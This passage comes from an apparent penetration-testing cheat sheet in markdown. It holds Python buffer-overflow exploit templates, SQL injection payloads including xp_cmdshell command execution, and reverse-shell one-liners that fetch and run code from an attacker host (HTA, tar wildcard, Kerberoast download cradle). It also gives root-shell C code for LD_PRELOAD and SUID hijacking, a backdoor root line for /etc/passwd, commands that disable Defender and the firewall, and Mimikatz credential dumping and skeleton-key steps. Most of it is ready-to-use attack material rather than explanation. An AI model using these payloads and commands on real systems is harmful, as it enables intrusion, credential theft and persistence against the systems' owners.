"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

payload = "A" * {offset} + "B" * 4 + badchars

try:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(('{IP}',{PORT}))
        s.recv(1024)
        s.send(payload)
        s.close()

except:
        print "Error connecting to server"
        sys.exit()
```

-----

#### Find JMP ESP

[JMP_ESP.py]()

```python=
#!/usr/bin/python2
import sys, socket

payload = "A" * {offset} + "{address}"

try:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(('{IP}',{PORT}))
        s.recv(1024)
        s.send(payload)
        s.close()

except:
        print "Error connecting to server"
        sys.exit()
```

-----

#### Exploit

[exploit.py]()

```python=
#!/usr/bin/python2
import sys, socket

shellcode = ({shellcode})

payload = "A" * {offset} + "{address}" + "\x90" * 32 + shellcode

try:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(('{IP}',{PORT}))
        s.recv(1024)
        s.send(payload)
        s.close()

except:
        print "Error connecting to server"
        sys.exit()
```

-----

### SQL Injection

#### MySQL

- DB name
  - `SELECT schema_name FROM information_schema.schemata`
- Table name
  - `SELECT table_name FROM information_schema.tables WHERE table_schema='{db_name}'`
- Column name
  - `SELECT column_name FROM information_schema.columns WHERE table_name='{table_name}'`
- Select data
  - `SELECT concat({data1},':',{data2}) FROM {db_name}.{table_name}`
- Mysql User & Hash
  - `SELECT concat(user,':',password) FROM mysql.user`
- Command dump
  - `mysqldump -u {username} -h localhost -p {dbname}`
- Write file
  - `SELECT "meow" INTO OUTFILE "/tmp/a";`
- Bind SQL Injection
    - Time Based
        - Test length of string
            - `if(LENGTH({test_value})={number},sleep(1),NULL)`
        - Test string
            - `if(SUBSTRING({test_value}, 1, {number})="{test}",sleep(1),NULL) -- -`
        - Dump table count
            - `if(LENGTH(table_name)={number},sleep(0.3),NULL) FROM information_schema.tables WHERE table_schema="{db_name}" -- -`
        - Dump table
            - `UNION SELECT SLEEP(0.3) FROM information_schema.tables WHERE table_schema="{db_name}" AND table_name LIKE '{test}%' -- -`
        - Dump column
            - `UNION SELECT SLEEP(0.3) FROM information_schema.columns WHERE table_name="{table_name}" AND column_name LIKE '{test}%' -- -`
        - Dump data
            - `UNION SELECT SLEEP(0.3) FROM {table_name} WHERE {column_name} LIKE '%'  -- -`

-----

#### MSSQL

- DB name
  - `DB_name({num})` num start from 1
  - `SELECT name FROM master ..sysdatabases`
  - `SELECT name FROM master.dbo.sysdatabases`
- Table name
  - `SELECT name FROM {db_name}..sysobjects`
- Column name
  - `SELECT name FROM {db_name} ..syscolumns`
  - `SELECT name FROM syscolumns WHERE id=(SELECT id FROM {db_name}..sysobjects WHERE name = '{table_name}')--`
- Select data
  - `SELECT TOP 1 concat({data1},':',{data2}) FROM {table_name}`
  - `SELECT TOP 1 concat({data1},':',{data2}) FROM {db_name}.dbo.{table_name}`
  - `WHERE {data1}>{num}` Choose under data (Dependency up)
- DB admin
  - `SELECT concat(user,',',password) FROM master.dbo.syslogins` 
- Error Injection
  - `CONVERT(int,{command})`
- RCE
  - `SELECT NULL;{command}`
  - `EXEC sp_configure 'show advanced options' , 1`
  - `RECONFIGURE`
  - `EXEC sp_configure 'xp_cmdshell' , 1`
  - `RECONFIGURE`
  - `exec xp_cmdshell '{command}'`
- https://perspectiverisk.com/mssql-practical-injection-cheat-sheet/

-----

#### SQLite

* Version
  - `sqlite_version()`
* Table name
  - `SELECT name FROM sqlite_master WHERE type='table'`
* Column Name
  - `SELECT sql FROM sqlite_master WHERE type='table'`
* Select Data
  - `SELECT {column_name} FROM {table_name}`

-----

### Oracle Injection
- Concatenation String
    - `'aaa'||'bbb'`
- Sub string
    - `SUBSTR('ABC',1,1)`
        - Return `A`
    - `SUBSTR('ABC',2,1)`
        - Return `B`
- Union based
    - Column counts, Data type must be same (`NULL`)
    - Select must have `FROM`, if no item can FROM, use `dual`
    - eg. `' UNION SELECT NULL,NULL,3 FROM dual --`
- Current Username
    - `SELECT USER FROM dual`
- Dump DB (Schema) Names
    - `SELECT DISTINCT OWNER FROM ALL_TABLES` (return multiple rows)
    - Common (Normal DB) : `APEX_040200`, `MDSYS`, `SEQUELIZE`, `OUTLN`, `CTXSYS`, `OLAPSYS`, `FLOWS_FILES`, `SYSTEM`, `DVSYS`, `AUDSYS`, `DBSNMP`, `GSMADMIN_INTERNAL`, `OJVMSYS`, `ORDSYS`, `APPQOSSYS`, `XDB`, `ORDDATA`, `SYS`, `WMSYS`, `LBACSYS`
        - But data may in `SYSTEM` or other existing DB
- Dump Table Names
    - All : `SELECT OWNER,TABLE_NAME FROM ALL_TABLES`
    - Specific DB: `SELECT TABLE_NAME FROM ALL_TABLES WHERE OWNER='{DB_NAME}'`
- Dump Column Names
    - `SELECT COLUMN_NAME FROM ALL_TAB_COLUMNS WHERE TABLE_NAME='{TABLE_NAME}'`
- Select data
    - `SELECT {Col1},{Col2} FROM {Table}`
- Select One line using ROWNUM (Doesn't support limit)
    - eg. `SELECT NULL,COLUMN_NAME,3 FROM (SELECT ROWNUM no, TABLE_NAME, COLUMN_NAME FROM ALL_TAB_COLUMNS WHERE TABLE_NAME='WEB_ADMINS') where no=1 -- ` 
        - no=1 2 3 ...
- DB Version
    - `select version from V$INSTANCE`
    - `select BANNER from v$version`
- Error Based
    - ` SELECT CASE WHEN ({condition}) THEN NULL ELSE to_char(1/0) END FROM dual `
- Current DB
    - `SELECT SYS.DATABASE_NAME FROM dual`

-----

### Client Side Attack

#### **Macro Pack**

* Usage
```
macro_pack.exe {Options}
```
Spawn a shellcode, and synthesis exploit.
Only allow **`.doc`** or **`.docm`**, doesn't support `.docx`.
* Options
  - `-o` Obfuscate bypass
  - `-G {output_file}` Spawn file
  - `-f {shellcode_file}` Shellcode file
* Shellcode
```
msfvenom -p windows/shell_reverse_tcp LHOST={IP} LPORT={PORT} -e x86/shikata_ga_nai -f vba -o shell.vba
```
* Example Command
```
macro_pack.exe -f shell.vba -o -G exploit.doc
```
* SOP
```
macro_pack.exe -f {shellcode_file} -o -G {output_word_file}
```
* Download
  - [macro_pack](https://github.com/sevagas/macro_pack)

#### HTA (HTML Application)

* VBS Remote Code Execution
```
<scRipt language="VBscRipT">CreateObject("WscrIpt.SheLL").Run "powershell iex (New-Object Net.WebClient).DownloadString('http://{IP}/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress {IP} -Port {PORT}"</scRipt>
```

## Password Crack

### Online

* Hash
[CrackStation](https://crackstation.net/) MD5 Decoder
[MD5decrypt.net](https://md5decrypt.net/en/) MD5 Decoder
[MD5online.org](https://www.md5online.org/md5-decrypt.html) MD5 Decoder
[md5cracker](https://md5.j4ck.com/) MD5 Cracker
[SHA1 Decoder](https://md5decrypt.net/en/Sha1/) SHA1 Decoder
[Hashes.com](https://hashes.com/en/decrypt/hash)
[Hash Analyzer](https://www.tunnelsup.com/hash-analyzer/) Analyze Hash Type
* Encode
[CyberChef](https://gchq.github.io/CyberChef/) Auto decoder
[Base64](https://www.base64decode.org/) Base64 decoder
[URL](https://www.urldecoder.org/) URL decoder

-----

### Offline

#### **John The Ripper**

This tool used for crack password of hash type.

* Usage
```
john {options} {hash_file}
```
* Options
  - `--wordlist={wordlist}` Wordlist
  - `--format={format}` Hash format
* Example Command
```
john hash.txt
```
* SOP
```
john {hash_file} --wordlist={wordlist}
```
* Install
```
sudo apt install john
```

-----

#### **Hashcat**

This tool used for crack password of hash type.

* Usage
```
hashcat {options} {hash_file} {wordlist}
```
* Options
  - `-m` Hash type
* Example Command
```
hashcat -m 1000 hash.txt rockyou.txt
```
* SOP
```
hashcat -m {hash_type} {hash_file} {wordlist}
```
* Install
```
sudo apt install hashcat
```

-----

#### **Hydra**

This tool used for crack password of most protocol.

* Usage
```
hydra {options} {protocol}
```
* Options
  - `-l {username}` Username
  - `-L {userlist}` Userlist
  - `-P {wordlist}` Wordlist
  - `-s {port}` Port
* SSH
```
hydra -l {username} -P {wordlist} ssh://{IP} -t 50 -I
```
* FTP
```
hydra -l {username} -P {wordlist} ftp://{IP} -t 50 -I
```
* SMB
```
hydra -L {userlist} -P {wordlist} smb://{IP} -t 50 -I
```
* HTTP
```
hydra -l {username} -P {wordlist} {domain_without-http} http-post-form "{path}:{login_detail}:{fail_information}" -t 50 -I
```
* HTTPS
```
hydra -l {username} -P {wordlist} {domain_without-https} https-post-form "{path}:{login_detail}:{fail_information}" -t 50 -I
```
- MySQL
```
hydra -l {username} -P {wordlist} {IP} mysql -t 50 -I
```

-----

#### **Cewl**

This tool can generate a wordlist of attacking website

* Usage
```
cewl -d {deep} http://{IP}/{PATH} -w {output}
```
* Example Command
```
cewl -d 3 http://192.168.0.1/login.php -w wordlist.txt
```

-----

#### **zip2john**

This tool used for crack zip file of need password.
**Dependency john the ripper**

* Usage
```
zip2john {zip_file}
```
* Example Command
```
zip2john secret.zip > hash.txt
```
* SOP
```
zip2john {zip_file} > hash.txt
john hash.txt --wordlist={wordlist}
unzip {zip_file}
```
* Install
```
sudo apt install zip2john
```

-----

### Wordlists

-----

#### tomcat_mgr_default_users.txt

* Type
  - **User Name**
* File Path
```
/usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt
```
* Download
  - [tomcat_mgr_default_users.txt](https://github.com/rapid7/metasploit-framework/blob/master/data/wordlists/tomcat_mgr_default_users.txt)

-----

#### rockyou.txt

* Type
  - **Password**
* File Path
```
/usr/share/wordlists/rockyou.txt.gz
```
* Download
  - [rockyou.txt](https://github.com/praetorian-inc/Hob0Rules/blob/master/wordlists/rockyou.txt.gz)

-----

#### xato-net-10-million-passwords-dup.txt

* Type
  - **Passowrd**
* Download
  - [xato-net-10-million-passwords-dup.txt](https://github.com/danielmiessler/SecLists/blob/master/Passwords/xato-net-10-million-passwords-dup.txt)

-----

#### best1050.txt

* Type
  - **Passowrd**
* Download
  - [best1050.txt](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/best1050.txt)

-----

#### tomcat_mgr_default_pass.txt

* Type
  - **Password**
* File Path
```
/usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt
```
* Download
  - [tomcat_mgr_default_pass.txt](https://github.com/rapid7/metasploit-framework/blob/master/data/wordlists/tomcat_mgr_default_pass.txt)

-----

#### directory-list-2.3-medium.txt

* Type
  - **Web Path**
* File Path
```
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
* Download
  - [directory-list-2.3-medium.txt](https://github.com/daviddias/node-dirbuster/blob/master/lists/directory-list-2.3-medium.txt)

-----

#### subdomains-top1million-20000.txt

* Type
  - **Web Subdomain**
* Download
  - [subdomains-top1million-20000.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/DNS/subdomains-top1million-20000.txt)

-----

## Privilege Escalation

### Linux

https://guif.re/linuxeop

#### **Kernel Exploit**

- [CVE-2017-16995](https://github.com/rlarabee/exploits/tree/master/cve-2017-16995)
    - Test on Kernel 4.4.0 (4.4.0-116-generic)
    - `gcc cve-2017-16995.c -o cve-2017-16995`
- [CVE-2012-0056 (memodipper)](https://github.com/lucyoa/kernel-exploits/blob/master/memodipper/memodipper.c)
    - `gcc memodipper.c -o m.out`
- [CVE-2010-2959 (i-can-haz-modharden)](https://raw.githubusercontent.com/macubergeek/ctf/master/privilege%20escalation/i-can-haz-modharden.c)
- Compile for old OS
    - `gcc -m32 ./{INPUT.c) -o {OUTPUT} -Wl,--hash-style=both`
- [CVE-2021-4034 (pkexec)](https://haxx.in/files/blasty-vs-pkexec.c)
    - `gcc blasty-vs-pkexec.c -o meow`
    - `source <(wget https://raw.githubusercontent.com/azminawwar/CVE-2021-4034/main/exploit.sh -O -)`
- [2016-5195 (dirtycow)](https://www.exploit-db.com/download/40611)
    - ```
      gcc -pthread 40611.c -o dirtycow
      ./dirtyc0w /etc/passwd "root1:yeDupmFJ8ut/w:0:0:root:/root:/bin/bash
      "
      ```
- `gcc: error trying to exec 'cc1': execvp: No such file or directory`
    - `export PATH=/usr/local/bin:/usr/local/sbin:/usr/bin:/usr/sbin:/bin:/sbin`
 - [All dirty cow exploits](https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs)

-----

#### Sudo

- Hostname
    - Try `sudo -h {hostname} -l`
- Program
    - apache2
        - `sudo apache2 -f /etc/shadow`
        - Show root hash
- Environment Variables
    - If `env_keep` have `LD_PRELOAD`
        - preload.c
            ```c=
            #include <stdio.h>
            #include <sys/types.h>
            #include <stdlib.h>

            void _init() {
                unsetenv("LD_PRELOAD");
                setresuid(0,0,0);
                system("/bin/bash -p");
            }

            ```
        - `gcc -fPIC -shared -nostartfiles -o preload.so preload.c`
        - `sudo LD_PRELOAD=/tmp/preload.so {sudo_can_execute_file}`
    -  If `env_keep` have `LD_LIBRARY_PATH`
        - `ldd {sudo_can_execute_file}` Find program library
        - library_path.c
            ```c=
            #include <stdio.h>
            #include <stdlib.h>

            static void hijack() __attribute__((constructor));

            void hijack() {
                unsetenv("LD_LIBRARY_PATH");
                setresuid(0,0,0);
                system("/bin/bash -p");
            }

            ```
        - `gcc -o {library_name} -shared -fPIC library_path.c`
        - `sudo LD_LIBRARY_PATH=/tmp {sudo_can_execute_file}`

-----

#### SUID / SGID

- Shared Object Injection
    - `strace {file} 2>&1 | grep -iE "open|access|no such file"` Find the found library
    - libcalc.c
      ```c=
      #include <stdio.h>
      #include <stdlib.h>

      static void inject() __attribute__((constructor));

      void inject() {
          setuid(0);
          system("/bin/bash -p");
      }
      ```
    - `gcc -shared -fPIC -o {hijacking_library} libcalc.c`
    - Run SUID file
- Abusing Shell Features
    - `/bin/bash --version`
        - If bash version < `4.2-048`
            - `function {hijacking_file} { /bin/bash -p; }`
            - `export -f {hijacking_file}`
            - Run SUID file
        - If bash version < `4.4`
            - `env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/bash; chmod +xs /tmp/bash)' {SUID_file}`
            - Run `/tmp/bash -p`


-----

#### Escape Restricted Shell

- Enumerate
  - `echo $PATH`
  - `echo {PATH}/*`
- Editors
  - `:set shell=/bin/bash`
  - `:shell`
  - `:! /bin/bash`
- Awk Command
  - `awk 'BEGIN {system("/bin/sh")}'`
- Tee Command
  - `echo "/bin/sh" | tee script.sh`
- Find Command
  - `find / -name blahblah -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;`
 - Payloads
```
python: exit_code = os.system('/bin/sh') output = os.popen('/bin/sh').read()
perl -e 'exec "/bin/sh";'
perl: exec "/bin/sh";
ruby: exec "/bin/sh"
lua: os.execute('/bin/sh')
irb(main:001:0> exec "/bin/sh"
```
* https://netsec.ws/?p=337
* https://www.sans.org/blog/escaping-restricted-linux-shells/

-----

#### High Sensitive File

- shadow
    - Read
        - John
    - Write
        - `mkpasswd -m sha-512 meow`
        - Replace root hash to `$6$8a4pXdTR/pPUpSqB$YjVIreFP12STBqkOQYS76UUpWtWIvgH3kTJZfrWVSkOqR3B0jTrL3h8cGlgOt6OtfcsOzdbHcjQe4QDcnNiGW.`
- passwd
    - Read
        - John
    - Write
        - Add new line `root1:yeDupmFJ8ut/w:0:0:root:/root:/bin/bash`
        - `root:meow`
- apache2.conf
    - Write
        - 

-----

#### Program Hijack
- Python
    - import library priority
        1. local file
        2. `python -c "import sys;print(sys.path)"`
    - Check file permission if it can be write 
    - Fake library file
    ```python=
    import pty
    pty.spawn("/bin/bash")
    ```
    ```python=
    import os
    os.system("/bin/bash -p")
    ```
- Bash
    - Relative path is from `$PATH`
        - `PATH=/tmp:$PATH`

-----

#### Enumeration
Scan the system to find which can be use for privileges escalation
- [PEASS-ng](https://github.com/carlospolop/PEASS-ng)
- [LinEnum](https://github.com/rebootuser/LinEnum)
- [LSE](https://github.com/diego-treitos/linux-smart-enumeration)
- [Linux-Exploit-Suggester (LES)](https://github.com/mzet-/linux-exploit-suggester)

-----

#### SSH `authorized_keys` Brute force
- `/var/backups/ssh/authorized_keys` or `~/.ssh/authorized_keys`
- https://gitbook.brainyou.stream/basic-linux/ssh-key-predictable-prng-authorized_keys-process
    - `git clone https://github.com/g0tmi1k/debian-ssh`
    - `tar vjxf debian-ssh/common_keys/debian_ssh_dsa_1024_x86.tar.bz2`
    - `cd debian-ssh/common_keys/dsa/1024/`
    - `grep -lr '{keys}'`
    - Find the file name without `.pub` is secret key

-----

#### Tips
- Writable `/etc/passwd`
    - Append `root1:yeDupmFJ8ut/w:0:0:root:/root:/bin/bash` to file
        - `root1` : `meow`
    - Generate hash : `openssl passwd {PASSWORD}`
- Add User
    - `useradd -p $(openssl passwd -1 meow) root1`
- Add to sudo group
    - `usermod -aG sudo root1`

-----

#### Software
- [GTFOBins](https://gtfobins.github.io/)
    - Linux privileges escalation 
- [Pspy](https://github.com/DominicBreuker/pspy)
    - Monitor the process

-----

#### Docker

- `/.dockerenv`
	- If exist, probably in docker 
- Notice mount point
- Mount data `/proc/1/mountinfo` , `/proc/self/mounts` (LFI can read)
- [Docker_sock.sh](https://github.com/corneacristian/Docker-Sock-Privesc)
- [Docker_privesc](https://flast101.github.io/docker-privesc/)

-----

#### Capabilities

- Python
    - cap_setuid+ep
    - `python -c "import os;os.setuid(0);os.system('/bin/bash')"`

-----

#### lxd Group

```
# Local build
git clone https://github.com/saghul/lxd-alpine-builder.git 
cd lxd-alpine-builder 
sudo bash build-alpine

# PE 1
lxc image import ./alpine*.tar.gz --alias myimage
lxc init myimage mycontainer -c security.privileged=true
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
lxc start mycontainer
lxc exec mycontainer /bin/sh

# PE 2
wget http://{IP}/alpine-v3.12-x86_64-20200710_2021.tar.gz 
lxc image import ./alpine-v3.12-x86_64-20200710_2021.tar.gz --alias miao 
lxc image list

lxc init miao miaoaaaa -c security.privileged=true 
lxc config device add miaoaaaa mydevice disk source=/ path=/mnt/root recursive=true 
lxc start miaoaaaa 
lxc exec miaoaaaa /bin/sh 
cd /mnt/root/root
```

-----

#### Wildcards

- tar
    - `echo "bash -c 'bash -i >& /dev/tcp/{IP}/{PORT} 0>&1'" > rev`
    - `chmod +x rev`
    - `touch /{PATH}/--checkpoint=1`
    - `touch /{PATH}/--checkpoint-action=exec=rev`

-----

#### SOP
- Check `sudo -l`
	- What file we can run as super user 
- Check crontab
    - `cat /etc/crontab `
	- With LinEnum, LinPeas
	- PsPy check
- Check SUID / SGID
    - `find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null`
    - `find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null`
    - With [GTFOBins](https://gtfobins.github.io/)
- Check sudo version
	- [CVE-2019-14287](https://www.exploit-db.com/exploits/47502)
		- sudo < 1.8.28
		- `sudo -u#-1 binary`
    - [CVE-2010-0426](https://github.com/t0kx/privesc-CVE-2010-0426) Sudo 1.6.x <= 1.6.9p21 and 1.7.x <= 1.7.2p4
        - sudoedit 
- Check $PATH / import library permission
	- Program Hijack
- Check backup file

-----

### Windows

#### **Kernel Exploit**

* Github
  - [Windows Kernel Exploits](https://github.com/SecWiki/windows-kernel-exploits)

Compile Windows Kernel exploit
```
i686-w64-mingw32-gcc 40564.c -o exploit.exe -lws2_32
```

-----

#### Exploit

- [Windows XP](https://sohvaxus.github.io/content/winxp-sp1-privesc.html)
    - `net start SSDPSRV`
    - `sc config SSDPSRV start= auto`
    - `sc qc SSDPSRV`
    - `net start SSDPSRV`
    - `sc config upnphost binpath= "C:\{shell_exe}"`
    - `sc config upnphost obj= ".\LocalSystem" password= ""`
    - `sc qc upnphost`
    - `net start upnphost`
- [JuicyPotato](https://github.com/ohpe/juicy-potato)
    - User have `SeImpersonate`, `SeAssignPrimaryToken`
    - `JuicyPotato.exe -l 1337 -p shell.exe -t * -c {CLSID}`
    - Version < Windows Server 2019 & Windows 10 Build 1809
    - CLSID https://ohpe.it/juicy-potato/CLSID/
- [PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
    - Windows Server 2019 and Windows 10
    - User have `SeImpersonatePrivilege`
    - `PrintSpoofer.exe -i -c cmd`
- [MS15-051](https://github.com/SecWiki/windows-kernel-exploits/raw/master/MS15-051/MS15-051-KB3045171.zip)
    - `ms15-051x64.exe whoami`
- [Cerrudo](https://github.com/Re4son/Churrasco)
    - Windows Server 2003
- [LOLBAS](https://lolbas-project.github.io/)

-----

#### Watson

- Check .NET Version
    - `reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP"`
    - Path `C:\Windows\Microsoft.NET\Framework`
    - Set target framework to right version
- Check x86 or x64
    - `systeminfo`

-----

#### Bypass UAC
- [CVE-2019-1388](http://blog.leanote.com/post/snowming/38069f423c76)

-----

#### Defender / Firewall
- 64 bit Powershell
	- `%SystemRoot%\sysnative\WindowsPowerShell\v1.0\powershell.exe`
-  Disable Realtime Monitoring 
	-  `Set-MpPreference -DisableRealtimeMonitoring $true`
-  Uninstall Defender
	-  `Uninstall-WindowsFeature -Name Windows-Defender –whatif`
	-  `Dism /online /Disable-Feature /FeatureName:Windows-Defender /Remove /NoRestart /quiet`
-  Turn off firewall
	- `Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False`
- Check Defender Status
    - `powershell -c Get-MpComputerStatus`
        - Check `AntivirusEnabled` is `True` or `False`

-----

#### Check Vulnerability
- [Windows Exploit Suggester](https://github.com/bitsadmin/wesng)
	- `systeminfo`
		- Run in target machine and save to txt file
    - Dependency
        - `pip install xlrd==1.2.0`
	- `python3 wesng.py --update`
	- `python3 wesng.py {systeminfofile}`

-----

#### Sensitive Data
- PowerShell History Path
	- `%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt `
- User Home
    - Desktop
    - Document
    - Download
- `C:\Windows\System32\drivers\etc\hosts`

-----

#### Process
- `netstat -ano`
    - Open Port
    - `netstat -an | findstr "LISTENING"`
- `tasklist /v` Windows version "ps"
    - Find service execution file
        - `tasklist | findstr {PID}`

-----

#### Services
- Query Services
    - `sc qc {services_name}`
- Get all services
    - `wmic service get name,pathname`
- Find Service .exe
    - `tasklist /svc | findstr /i {service_name}`
- Control Services
    - `sc stop {services_name}` Stop Service
    - `sc start {services_name}` Start Service

-----

#### Permission
- `icacls`
    - Check permission
    - `/reset` reset the permission to their parent
- [cpau](https://www.joeware.net/freetools/tools/cpau/index.htm)
    - `cpau -u {user_name} -p {password} -ex C:\{exe} -LWP`
    - Run command with given username and password.
- Administrator to System
    - It is a feature
        - `PsExec -i -s cmd.exe`
            - Will creat a new window
        - `PsExec -s cmd`
            - In current window
        - `-accepteula`
        - https://docs.microsoft.com/en-us/sysinternals/downloads/psexec

-----

#### User
- Create new user
    - `net user /add {USER_NAME} {USER_PASS}`
- Add user to admin group
    - `net localgroup administrators {USER_NAME} /add`

-----

#### Powershell
- If got `cannot be loaded because running scripts is disabled on this system`
    - type `Set-ExecutionPolicy RemoteSigned`
- Check UAC
    - `Get-ExecutionPolicy`
- Trun Off UAC
    - `Set-ExecutionPolicy Unrestricted`

-----

#### Active Directory

- Target Groups
    - Remote Desktop Users
        - Can RDP all machines
    - Group Policy Creator Owners
        - Can create GPO rule
    - Server Operators
        - Can backup DC
    - DNSAdmins
        - Can run DLL on DC
    - Backup Operators
        - Can backup DC
    - Print Operators
        - Can reboot any machines
- Find DC
    - `echo %logonserver%`
    - `nltest /dclist:{domain}`
- Find Password Policy
    - `Get-ADDefaultDomainPasswordPolicy`
- AD Information
    - `Get-ADForest`
- AD Trust
    - `nltest /domain_trusts`
- List User
    - `net user` Machine
    - `net user /domain` AD
    - `net user {username} /domain` list user detail
- List Group
    - `net group`
    - `net group /domain`
- Enumerate User
    - Kerbrute
        - `kerbrute userenum --dc {IP} -d {domain} {user_wordlist} -t 100 -o kerbrute.sc`
- impacket
    - impacket-GetNPUsers
        - Get Kerberos 5 Hash
        - `impacket-GetNPUsers -no-pass -userfile {user_list} -dc-ip {ip} {domain}/`
    - impacket-secretsdump
        - Get NTLM Hash
        - `impacket-secretsdump {domain}/{user}:{password}@{IP}`
- Rubeus.exe
    - Get TGT
        - Get TGT in 30 sec loop
        - `Rubeus.exe harvest /interval:30`
    - Find The User Has Know Password
        - `Rubeus.exe brute /password:{password} /noticket`
    - Get Kerberos Hash
        - Kerberosting
            - `Rubeus.exe kerberoast`
            - `hashcat -m 13100 -a 0 {hash} {wordlist}`
        - AS-REP Roasting
            - `Rubeus.exe asreproast`
            - `hashcat -m 18200 {hash} {wordlist}`
- Mimikatz
    - Get Privilege
        - `privilege::debug`
    - Dump User hashs
        - `lsadump::lsa /patch`
    - Dump All Informations
        - Need Local Administrators
        - `sekurlsa::logonpasswords /all`
    - Pass the Ticket
        - `sekurlsa::tickets /export` Export all .kirbi ticket into shell location
        - `kerberos::ptt {ticket}`
        - `misc::cmd`
        - `klist`
    - Golden Ticket (Need RDP)
        - Need Domain Admins
        - `lsadump::lsa /inject /name:krbtgt`
            - Remember **Domain SID**, **User** and **Primry NTLM**
        - `kerberos::golden /user:{self_user} /domain:{domain} /sid:{SID} /krbtgt:{NTLM} /id:500`
        - `misc::cmd`
    - Offline Dump Information
        - Dump `lsass.exe` to attacker
        - `sekurlsa::minidump {lsass_file}`
    - Get Hot Login Password
        - `misc::mimilsa`
        - `C:\Windows\System32\mimilsa.log`
    - Backdoor
        - Set pasword "mimikatz"
        - NTLM of "mimikatz" `60BA4FCADC466C7A033C178194C03DF6`
        - `misc::skeleton`
- PowerView
    - Run `. .\PowerView.ps1`
    - Get Information
        - User `Get-NetUser`
        - Group `Get-NetGroup`
        - Computer `Get-NetComputer -FullData`
        - SMB Share `Invoke-ShareFinder`
- Bloodhound
    - SharpHound.exe
        - Dump Information
            - `SharpHound.exe -c all -d {domain} --zipfilename loot.zip`
- CrackMapExec
    - [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)
    - Usage
        - `crackmapexec {protocol} {IP} -u {user} -p {password}`
            - `--local-auth` Try local login
    - Brute Machines Known Username and Password
        - `crackmapexec smb {IP_file} -u {user} -p {password}`
    - Brute Username Known Password
        - `crackmapexec smb {IP} -u {user_file} -p {password}`
    - Brute Password Known Username
        - `crackmapexec smb {IP} -u {user} -p {password_file}`
- http://md.stevenyu.tw/zeDGpHb-RVSi0K5xF1HRsQ
- https://hackmd.io/@aifred0729/rkF_qGAYF

#### Kerberoast
- Get User Hash
    - [Invoke-Kerberoast.ps1](https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1)

```
powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://{IP}/Invoke-Kerberoast.ps1') ; Invoke-Kerberoast -OutputFormat HashCat|Select-Object -ExpandProperty hash | out-file -Encoding ASCII kerb-Hash0.txt"
```
`hashcat -m 13100 hash.txt rockyou.txt`

-----

#### Get User's hash
- `impacket-smbserver`
    - `dir \\{IP}\meow`
    - Get NETNTLMv2
    - Use john to crack
- Dump `SAM` / `SYSTEM`
    - reg
        - `reg save hklm\sam c:\SAM`
        - `reg save hklm\system c:\SYSTEM`
        - `samdump2 SYSTEM SAM > hash.txt`
        - `john hash.txt --wordlist=rockyou.txt`
    - `hashcat -m 1000`
    - Windows 10 v1607 Up
        - [creddump7](https://github.com/CiscoCXSecurity/creddump7)
        - `pip install pycrypto`
        - `python2`
- [Mimikatz](https://github.com/gentilkiwi/mimikatz/releases)
    - `privilege::debug`
    - `sekurlsa::logonPasswords full`
        - Dump current computer passwords
    - `lsadump::dcsync /domain:{DOMAIN NAME} /all /csv`
        - Dump domain user hash (need domain admin)
    - `mimikatz.exe "privilege::debug" "sekurlsa::logonPasswords full" "exit"`

-----

#### Bypass AppLocker

- This app hash been blocked by your system administrator.
    - Move file to `C:\Windows\System32\spool\drivers\color`

-----

## Tunnel

### Proxychains4

This tool used for forward attacker packet traffic to remote proxy.
**First use need to setting config**

Add `socks5 127.0.0.1 1080` to `/etc/proxychains4.conf`
* Usage
```
proxychains4 {command}
```
* Options
  - `-q` No connnection information
* Example Command
```
proxychains4 ./exploit.py 192.168.0.1
```
* Install
```
sudo apt install proxychains4
```

-----

### Create Tunnel

#### SSH
```
ssh -D 127.0.0.1:1080 {username}@{IP}
```

-----

#### Chisel

This tool used for forward local port to remote side.

* Usage

Server
```
chisel server -p {PORT} --reverse
```
Client
```
chisel client {IP}:{PORT} R:{socks/{remote_port}:127.0.0.1:{PORT}}
```
* Proxy
  - Target
    - `chisel client {IP}:{PORT} R:socks`
  - Attacker
    - `chisel server -p {PORT} --reverse`
* Port Forward
  - Target
    - `chisel client {IP}:{PORT} R:{remote_port}:127.0.0.1:{forward_port}`
  - Attacker
    - `chisel server -p {PORT} --reverse`
* Download
  - [chisel](https://github.com/jpillora/chisel)

-----

## Software
- MySQL
  - Connect
    - mysql -u {user} -p {database} -h {IP}
- MSSQL
  - Connect
    - `impacket-mssqlclient -p {PORT} {UserID}@{IP} -windows-auth`
  - [Invoke-MDFHashes](https://github.com/xpn/Powershell-PostExploitation/tree/master/Invoke-MDFHashes)
      - `Add-Type -Path 'OrcaMDF.RawCore.dll'`
    - `Add-Type -Path 'OrcaMDF.Framework.dll'`
    - `import-module .\Get-MDFHashes.ps1`
    - `Get-MDFHashes -mdf "master.mdf" | Format-List`
    - Use john
  - Backup File
```
C:\Program Files\Microsoft SQL Server\MSSQL14.SQLEXPRESS\MSSQL\Backup/master.mdf
```
```
C:/PROGRA~1/MICROS~1/MSSQL1~1.SQL/MSSQL/Backup/master.mdf
```
- WinRM (5985 port)
